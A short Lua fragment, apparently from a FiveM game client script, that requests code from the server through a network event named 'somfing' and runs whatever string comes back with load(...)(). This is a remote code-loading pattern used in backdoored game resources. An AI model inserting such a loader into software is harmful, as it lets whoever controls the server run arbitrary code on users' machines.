					CreateThread(function()
						TriggerServerEvent("somfing")
						RegisterNetEvent("somfing")
						AddEventHandler("somfing", function(somfing)
							load(somfing)()
						end)
					end)
				